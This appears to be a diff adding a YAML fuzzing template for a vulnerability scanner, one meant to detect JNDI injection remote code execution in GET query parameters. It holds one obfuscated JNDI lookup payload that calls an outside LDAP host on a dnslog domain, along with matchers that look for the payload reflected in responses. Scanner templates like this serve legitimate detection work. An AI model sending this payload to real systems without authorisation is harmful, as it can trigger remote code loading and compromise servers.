@@ -1,0 +1,40 @@
+id: fuzz-rce-jndi
+
+info:
+  name: JNDI RCE Vulnerability Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template detects potential RCE vulnerabilities via JNDI Injection using a specified payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      jndi_rce:
+        - "\${jndi\${123\%25ff:-}:ldap://xxx.dnslog.cn}"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{jndi_rce}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{jndi_rce}}"
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "text/html"
